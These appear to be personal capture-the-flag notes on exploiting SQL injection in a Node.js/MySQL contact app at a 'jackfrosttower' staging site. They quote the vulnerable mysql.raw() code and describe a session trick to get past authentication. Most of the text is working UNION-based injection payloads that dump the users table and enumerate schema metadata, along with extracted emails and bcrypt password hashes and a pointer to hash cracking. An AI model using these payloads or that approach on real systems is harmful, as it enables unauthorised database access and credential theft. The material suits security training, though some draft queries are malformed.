# Classic SQL Injection

# MySQL

DB credentials
```javascript
var mysql = require('mysql');

function createCon(){
    var connection  = mysql.createPool({
        connectionLimit: 4000,
        queueLimit: 3000,
        host: 'db',
        user: 'encontact',
        password: '',
        database: 'encontact',
        port: 3306,
        insecureAuth: true
    });

    return connection;
}

module.exports = createCon;
```

# SQL Queries
Searching server.js for queries that don't protect against SQL injection [note](https://github.com/mysqljs/mysql#escaping-query-values)
# References
- [SQLInjection](https://github.com/mysqljs/mysql)
- [Express](https://www.npmjs.com/package/express-session)

# Dashboard
contact twice with the same email and it will store your email in the `session.uniqueID` key. A non-null value is needed in order to authenticate a user. That's the trick.

# SQLi

The issue here is the call to [mysql.raw()](https://github.com/mysqljs/mysql#escaping-query-values)
```javascript
var query = "SELECT * FROM uniquecontact WHERE id=";

    if (session.uniqueID){

        try {
            if (reqparam.indexOf(',') > 0){
                var ids = reqparam.split(',');
                reqparam = "0";
                for (var i=0; i<ids.length; i++){
                    query += tempCont.escape(m.raw(ids[i]));
                    query += " OR id="
                }
                query += "?";
            }else{
                query = "SELECT * FROM uniquecontact WHERE id=?"
            }
```

```
957,956 union select * from users where token = ''--

[select%20id,%20name%20as%20full_name,%20email%20as%20email,%20null%20as%20phone,%20password%20as%20country,%20date_created,%20null%20as%20date_update%20from%20users](https://staging.jackfrosttower.com/detail/957,956%20union%20select%20*%20from%20users%20where%20token%20=%20''--)
```
root@localhost $2b$15$KOFchO9HQuAuGqs0SqYKq.fH1n8ssHP7.nSL58Dd53doWHkNoJtte
foo@bar.baz $2b$15$4OKMqPzc8OrmeXmRdJT5nuZrO14FIoacCmOlzKpkYvJcMyVYkXqbC
coolio123@coolio.com $2b$15$Gw/iywBkz6wbhFTTBAjFUO0OkqIYnTP1lW03hjxNF456zznvPctqm

blah@blah:stop

# References
- https://cryptokait.com/2020/02/24/password-cracking-with-hashcat/ 

```sql
SELECT * from uniquecontact where ID=123 OR ID=456 

union 
SELECT NOW() as date_update from (
    select * from uniquecontact 
full outer JOIN users on uniquecontact.full_name = user.name 
where 1=1;

SELECT column_name(s)
FROM table1
FULL OUTER JOIN table2
ON table1.column_name = table2.column_name
WHERE condition;

1,2 UNION SELECT DISTINCT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT column_name FROM information_schema.columns WHERE table_name ="todo" and table_schema LIKE 'encontact')d  JOIN (SELECT table_rows FROM information_schema.tables WHERE table_schema LIKE 'encontact')e  JOIN (SELECT 6)f JOIN (SELECT 7)g LIMIT 10 --

1,2 UNION SELECT DISTINCT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT completed FROM todo)d  JOIN (SELECT note FROM todo)e  JOIN (SELECT 6)f JOIN (SELECT 7)g LIMIT 12 --
```